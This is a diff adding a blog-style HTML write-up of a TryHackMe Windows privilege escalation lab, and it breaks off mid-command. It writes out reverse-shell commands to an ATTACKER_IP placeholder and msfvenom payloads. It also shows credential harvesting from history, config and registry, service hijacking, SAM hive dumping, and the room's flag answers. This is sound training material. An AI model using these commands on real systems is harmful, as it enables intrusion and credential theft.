@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Windows Privilege Escalation · THM Writeups</title>
+  
+  <meta name="description" content="Learn the fundamentals of Windows privilege escalation techniques." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>Windows Privilege Escalation</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">PrivilegeEscalation/WindowsPrivilegeEscalation/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">windows</span>
+          
+          <span class="tag-pill">privesc</span>
+          
+        
+        
+        <span class="writeup-meta-desc">Learn the fundamentals of Windows privilege escalation techniques.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="windows-privilege-escalation"><a href="https://tryhackme.com/room/windowsprivesc20">Windows Privilege Escalation</a></h1>
+
+<h2 id="windows-privilege-escalation-1">Windows Privilege Escalation</h2>
+
+<p>While we will usually want to have administrative rights, there might be situations where we’ll need to escalate into other unprivileged accounts before actually getting administrative privileges.</p>
+
+<p>Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won’t always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:</p>
+
+<ul>
+  <li>Misconfigurations on Windows services or scheduled tasks</li>
+  <li>Excessive privileges assigned to our account</li>
+  <li>Vulnerable software</li>
+  <li>Missing Windows security patches</li>
+</ul>
+
+<h3 id="windows-users">Windows Users</h3>
+
+<p>Depending on their access levels, we can categorise a user in one of the following groups:</p>
+<ul>
+  <li><strong>Administrators</strong>
+    <ul>
+      <li>These users have the most privileges. They can change any system configuration parameter and access any file in the system.</li>
+    </ul>
+  </li>
+  <li><strong>Standard Users</strong>
+    <ul>
+      <li>These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Any user with administrative privileges will be part of the <strong>Administrators</strong> group. On the other hand, standard users are part of the <strong>Users</strong> group.</p>
+
+<p> Special built-in accounts used by the operating system in the context of privilege escalation:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>SYSTEM / LocalSystem</strong></th>
+      <th>An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Local Service</strong></td>
+      <td>Default account used to run Windows services with “minimum” privileges. It will use anonymous connections over the network.</td>
+    </tr>
+    <tr>
+      <td><strong>Network Service</strong></td>
+      <td>Default account used to run Windows services with “minimum” privileges. It will use the computer credentials to authenticate through the network.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>These accounts are created and managed by Windows, and you won’t be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.</p>
+
+<h3 id="questions">Questions</h3>
+
+<p>Q: Users that can change system configurations are part of which group?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">Administrators</code></p>
+
+<p>Q: The SYSTEM account has more privileges than the Administrator user (aye/nay)</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">aye</code></p>
+
+<h2 id="harvesting-passwords-from-usual-spots">Harvesting Passwords from Usual Spots</h2>
+
+<p>The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.</p>
+
+<p>When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don’t require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">C:\Unattend.xml</code></li>
+  <li><code class="language-plaintext highlighter-rouge">C:\Windows\Panther\Unattend.xml</code></li>
+  <li><code class="language-plaintext highlighter-rouge">C:\Windows\Panther\Unattend\Unattend.xml</code></li>
+  <li><code class="language-plaintext highlighter-rouge">C:\Windows\system32\sysprep.inf</code></li>
+  <li><code class="language-plaintext highlighter-rouge">C:\Windows\system32\sysprep\sysprep.xml</code></li>
+</ul>
+
+<p>As part of these files, you might encounter credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Credentials&gt;
+    &lt;Username&gt;Administrator&lt;/Username&gt;
+    &lt;Domain&gt;thm.local&lt;/Domain&gt;
+    &lt;Password&gt;MyPassword123&lt;/Password&gt;
+&lt;/Credentials&gt;
+</code></pre></div></div>
+
+<h3 id="powershell-history">Powershell History</h3>
+
+<p>Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a <code class="language-plaintext highlighter-rouge">cmd.exe</code> prompt:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre></div></div>
+
+<p><strong>Note:</strong> The command above will only work from cmd.exe, as Powershell won’t recognize <code class="language-plaintext highlighter-rouge">%userprofile%</code> as an environment variable. To read the file from Powershell, you’d have to replace <code class="language-plaintext highlighter-rouge">%userprofile%</code> with <code class="language-plaintext highlighter-rouge">$Env:userprofile</code>.</p>
+
+<h3 id="saved-windows-credentials">Saved Windows Credentials</h3>
+
+<p>Windows allows us to use other users’ credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cmdkey /list
+</span></code></pre></div></div>
+
+<p>While you can’t see the actual passwords, if you notice any credentials worth trying, you can use them with the <code class="language-plaintext highlighter-rouge">runas</code> command and the <code class="language-plaintext highlighter-rouge">/savecred</code> option, as seen below.</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">runas /savecred /user:admin cmd.exe
+</span></code></pre></div></div>
+
+<h3 id="iis-configuration">IIS Configuration</h3>
+
+<p>Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called <code class="language-plaintext highlighter-rouge">web.config</code> and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:</p>
+
+<ul>
+  <li>C:\inetpub\wwwroot\web.config</li>
+  <li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
+</ul>
+
+<p>Here is a quick way to find database connection strings on the file:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">type</span> <span class="nf">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span> <span class="nf">|</span> <span class="nf">findstr</span> <span class="nf">connectionString</span>
+</code></pre></div></div>
+
+<h3 id="retrieve-credentials-from-software-putty">Retrieve Credentials from Software: PuTTY</h3>
+
+<p>PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection’s parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won’t allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.</p>
+
+<p>To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+</span></code></pre></div></div>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>Q: A password for the julia.jones user has been left on the Powershell history. What is the password?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_13-46.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">ZuperCkretPa5z</code></p>
+
+<p>Q: A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_13-48.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">098n0x35skjD3</code></p>
+
+<p>Q: There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.</p>
+
+<p>We list the saved credentials:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_13-50.png" alt="" /></p>
+
+<p>We then use <code class="language-plaintext highlighter-rouge">runas</code> for the user <code class="language-plaintext highlighter-rouge">mike.katz</code> to spawn a shell:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">runas</span> <span class="nv">/savecred</span> <span class="nv">/user:mike.katz</span> <span class="nf">cmd.exe</span>
+</code></pre></div></div>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_13-52.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{WHAT_IS_MY_PASSWORD} </code></p>
+
+<p>Q: Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_13-54.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">CoolPass2021</code></p>
+
+<h2 id="other-quick-wins">Other Quick Wins</h2>
+
+<h3 id="scheduled-tasks">Scheduled Tasks</h3>
+
+<p>Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it’s using a binary you can modify.</p>
+
+<p>Scheduled tasks can be listed from the command line using the <code class="language-plaintext highlighter-rouge">schtasks</code> command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">schtasks</span> <span class="nv">/query</span> <span class="nv">/tn</span> <span class="nf">vulntask</span> <span class="nv">/fo</span> <span class="nf">list</span> <span class="nv">/v</span>
+</code></pre></div></div>
+
+<p>You will get lots of information about the task, but what matters for us is the “Task to Run” parameter which indicates what gets executed by the scheduled task, and the “Run As User” parameter, which shows the user that will be used to execute the task.</p>
+
+<p>If our current user can modify or overwrite the “Task to Run” executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use <code class="language-plaintext highlighter-rouge">icacls</code>:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">icacls</span> <span class="nf">c:\tasks\schtask.bat</span>
+</code></pre></div></div>
+
+<p>If the <strong>BUILTIN\Users</strong> group has full access (F) over the task’s binary, we can then modify the .bat file and insert any payload we like.</p>
+
+<p>We can then spawn a reverse shell:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">C:\</span><span class="p">&gt;</span> <span class="nf">echo</span> <span class="nf">c:\tools\nc64.exe</span> <span class="nf">-e</span> <span class="nf">cmd.exe</span> <span class="nf">ATTACKER_IP</span> <span class="mf">1337</span> <span class="p">&gt;</span> <span class="nf">C:\tasks\schtask.bat</span>
+</code></pre></div></div>
+
+<p>And start a listener on our machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 1337
+</code></pre></div></div>
+
+<p>While we probably wouldn’t be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, if we have enough permissions, we can start the task manually with the following command:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">schtasks</span> <span class="nv">/run</span> <span class="nv">/tn</span> <span class="nf">vulntask</span>
+</code></pre></div></div>
+
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
+
+<p>Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.</p>
+
+<p>This method requires two registry values to be set. You can query these from the command line using the commands below.</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">reg</span> <span class="nf">query</span> <span class="nf">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span> 
+<span class="nf">reg</span> <span class="nf">query</span> <span class="nf">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span>
+</code></pre></div></div>
+
+<p>If these are set, you can generate a malicious .msi file using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>ATTACKING_MACHINE_IP <span class="nv">LPORT</span><span class="o">=</span>LOCAL_PORT <span class="nt">-f</span> msi <span class="nt">-o</span> malicious.msi
+</code></pre></div></div>
+
+<p>As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">msiexec</span> <span class="nv">/quiet</span> <span class="nv">/qn</span> <span class="nv">/i</span> <span class="nf">C:\Windows\Temp\malicious.msi</span>
+</code></pre></div></div>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>We list the scheduled tasks:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-03.png" alt="" /></p>
+
+<p>We notice a task that runs <code class="language-plaintext highlighter-rouge">schtask.bat</code> by the user <code class="language-plaintext highlighter-rouge">taskusr1</code>.</p>
+
+<p>We check if the current user has enough permissions to modify the executable:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-05.png" alt="" /></p>
+
+<p>We do. We open a listener on our machine using <code class="language-plaintext highlighter-rouge">nc -lnvp 1337</code> and connect to it using the <code class="language-plaintext highlighter-rouge">nc</code> executable found on the desktop of the target machine. Note that we also have to manually run the task:</p>
+
+<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">echo</span> <span class="nf">c:\tools\nc64.exe</span> <span class="nf">-e</span> <span class="nf">cmd.exe</span> <span class="nf">ATTACKER_IP</span> <span class="mf">1337</span> <span class="p">&gt;</span> <span class="nf">C:\tasks\schtask.bat</span>
+<span class="nf">schtasks</span> <span class="nv">/run</span> <span class="nv">/tn</span> <span class="nf">vulntask</span>
+</code></pre></div></div>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-10.png" alt="" /></p>
+
+<p>We navigate to the desktop and print the flag:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-11.png" alt="" /></p>
+
+<p>Q: What is the taskusr1 flag?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{TASK_COMPLETED}</code></p>
+
+<h2 id="abusing-service-misconfigurations">Abusing Service Misconfigurations</h2>
+
+<p>Windows services are managed by the <strong>Service Control Manager</strong> (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.</p>
+
+<p>Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.</p>
+
+<p>To better understand the structure of a service, let’s check the apphostsvc service configuration with the <code class="language-plaintext highlighter-rouge">sc qc</code> command:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-23.png" alt="" /></p>
+
+<p>Here we can see that the associated executable is specified through the <strong>BINARY_PATH_NAME</strong> parameter, and the account used to run the service is shown on the <strong>SERVICE_START_NAME</strong> parameter.</p>
+
+<p>Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.</p>
+
+<p>All of the services configurations are stored on the registry under <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Services\</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/06c05c134e4922ec8ff8d9b56382c58f.png" alt="" /></p>
+
+<p>A subkey exists for every service in the system. Again, we can see the associated executable on the <strong>ImagePath</strong> value and the account used to start the service on the <strong>ObjectName</strong> value. If a DACL has been configured for the service, it will be stored in a subkey called <strong>Security</strong>. As you have guessed by now, only administrators can modify such registry entries by default.</p>
+
+<h3 id="insecure-permissions-on-service-executable">Insecure Permissions on Service Executable</h3>
+
+<p>If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service’s account trivially.</p>
+
+<p>To understand how this works, let’s look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using <code class="language-plaintext highlighter-rouge">sc</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-26.png" alt="" /></p>
+
+<p>We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in <code class="language-plaintext highlighter-rouge">C:\Progra~2\System~1\WService.exe</code>. We then proceed to check the permissions on the executable:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-27.png" alt="" /></p>
+
+<p>And here we have something interesting. The Everyone group has modify permissions (M) on the service’s executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.</p>
+
+<p>Let’s generate an exe-service payload using msfvenom and serve it through a python webserver:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>ATTACKER_IP <span class="nv">LPORT</span><span class="o">=</span>4445 <span class="nt">-f</span> exe-service <span class="nt">-o</span> rev-svc.exe
+
+python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>We can then pull the payload from Powershell with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://ATTACKER_IP:8000/rev-svc.exe <span class="nt">-O</span> rev-svc.exe
+</code></pre></div></div>
+
+<p>Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we’ll want to grant full permissions to the Everyone group as well:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-28.png" alt="" /></p>
+
+<p>We then start a listener on port 4445 on our machine.</p>
+
+<p>And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, in this case, we can restart the service ourselves in <code class="language-plaintext highlighter-rouge">cmd.exe</code>:</p>
+
+<pre><code class="language-cmd">sc stop windowsscheduler 
+sc start windowsscheduler
+</code></pre>
+
+<h3 id="unquoted-service-paths">Unquoted Service Paths</h3>
+
+<p>When we can’t directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.</p>
+
+<p>When working with Windows services, a very particular behaviour occurs when the service is configured to point to an “unquoted” executable. By unquoted, we mean that the path of the associated executable isn’t properly quoted to account for spaces on the command.</p>
+
+<p>As an example, let’s look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by <code class="language-plaintext highlighter-rouge">"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</code>, followed by the given parameters:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-38.png" alt="" /></p>
+
+<p>Now let’s look at another service without proper quotation:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-39.png" alt="" /></p>
+
+<p>When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the “Disk Sorter Enterprise” folder, the command becomes ambiguous, and the SCM doesn’t know which of the following you are trying to execute:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-40.png" alt="" /></p>
+
+<p>This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the “right” interpretation of the unquoted command would be to execute <code class="language-plaintext highlighter-rouge">C:\\MyPrograms\\Disk.exe</code> and take the rest as arguments.</p>
+
+<p>Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:</p>
+
+<ol>
+  <li>First, search for <code class="language-plaintext highlighter-rouge">C:\\MyPrograms\\Disk.exe</code>. If it exists, the service will run this executable.</li>
+  <li>If the latter doesn’t exist, it will then search for <code class="language-plaintext highlighter-rouge">C:\\MyPrograms\\Disk Sorter.exe</code>. If it exists, the service will run this executable.</li>
+  <li>If the latter doesn’t exist, it will then search for <code class="language-plaintext highlighter-rouge">C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.</li>
+</ol>
+
+<p>From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.</p>
+
+<p>While this sounds trivial, most of the service executables will be installed under <code class="language-plaintext highlighter-rouge">C:\Program Files</code> or <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)</code> by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.</p>
+
+<p>In our case, the Administrator installed the Disk Sorter binaries under <code class="language-plaintext highlighter-rouge">c:\MyPrograms</code>. By default, this inherits the permissions of the <code class="language-plaintext highlighter-rouge">C:\</code> directory, which allows any user to create files and folders in it. We can check this using <code class="language-plaintext highlighter-rouge">icacls</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-40_1.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">BUILTIN\\Users</code> group has <strong>AD</strong> and <strong>WD</strong> privileges, allowing the user to create subdirectories and files, respectively.</p>
+
+<p>The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before.</p>
+
+<p>Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to <code class="language-plaintext highlighter-rouge">C:\MyPrograms\Disk.exe</code>. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:</p>
+
+<pre><code class="language-cmd">move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+</code></pre>
+
+<p>Once the service gets restarted, your payload should execute:</p>
+
+<pre><code class="language-cmd">sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+</code></pre>
+
+<h3 id="insecure-service-permissions">Insecure Service Permissions</h3>
+
+<p>You might still have a slight chance of taking advantage of a service if the service’s executable DACL is well configured, and the service’s binary path is rightly quoted. Should the service DACL (not the service’s executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.</p>
+
+<p>To check for a service DACL from the command line, you can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk(opens in new tab)</a> from the Sysinternals suite.</p>
+
+<p>Command to check for the thmservice service DACL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>accesschk64.exe -qlc thmservice
+</code></pre></div></div>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-54.png" alt="" /></p>
+
+<p>Here we can see that the <code class="language-plaintext highlighter-rouge">BUILTIN\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.</p>
+
+<p>Before changing the service, we build another exe-service reverse shell and start a listener for it.</p>
+
+<p>We will then transfer the reverse shell executable to the target machine and store it in <code class="language-plaintext highlighter-rouge">C:\Users\thm-unpriv\rev-svc3.exe</code>.
+Remember to grant permissions to Everyone to execute your payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+</code></pre></div></div>
+
+<p>To change the service’s associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+</code></pre></div></div>
+
+<p>Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop THMService
+sc start THMService
+</code></pre></div></div>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>Q: Get the flag on svcusr1’s desktop.</p>
+
+<p>We follow precisely the instructions from above.</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_14-36.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{AT_YOUR_SERVICE}</code></p>
+
+<p>Q: Get the flag on svcusr2’s desktop.</p>
+
+<p>We again follow the notes from above to get the flag:</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{QUOTES_EVERYWHERE}</code></p>
+
+<p>Q: Get the flag on the Administrator’s desktop.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{INSECURE_SVC_CONFIG}</code></p>
+
+<h2 id="abusing-dangerous-privileges">Abusing dangerous privileges</h2>
+
+<h3 id="windows-privileges">Windows Privileges</h3>
+
+<p>Each user has a set of assigned privileges that can be checked with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /priv
+</code></pre></div></div>
+
+<p>A complete list of available privileges on Windows systems is available <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here(opens in new tab)</a>. From an attacker’s standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin(opens in new tab)</a> Github project.</p>
+
+<h3 id="sebackup--serestore">SeBackup / SeRestore</h3>
+
+<p>The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p>
+
+<p>Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator’s password hash.</p>
+
+<p>We will need to login as a user which is part of the ”Backup Operators” group, that by default is granted the SeBackup and SeRestore privileges. We need to open a command prompt using the “Open as administrator” option to use these privileges.</p>
+
+<p>To backup the SAM and SYSTEM hashes, we can use the following commands:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm\system C:\Users\THMBackup\system.hive
+
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+</code></pre></div></div>
+
+<p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket’s <code class="language-plaintext highlighter-rouge">smbserver.py</code> to start a simple SMB server with a network share in the current directory of our attacking machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>share
